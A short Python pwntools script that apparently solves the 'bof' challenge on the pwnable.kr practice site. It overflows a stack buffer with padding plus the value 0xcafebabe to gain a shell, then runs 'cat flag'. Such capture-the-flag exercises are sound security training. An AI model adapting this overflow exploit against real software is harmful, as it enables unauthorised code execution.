#!/usr/bin/python

from pwn import *

# open connection
#conn = process('./bof') # local process for debugging
conn = remote('pwnable.kr', 9000)

# prepare payload
payload = 'aaaa' * 13 + pack(0xcafebabe, 'all', 'little', True)
print 'Payload: ', payload

# send payload
print 'Sending payload...'
conn.sendline(payload)
print 'Sending cat flag...'
conn.sendline('cat flag')

# get output
print conn.recvline()
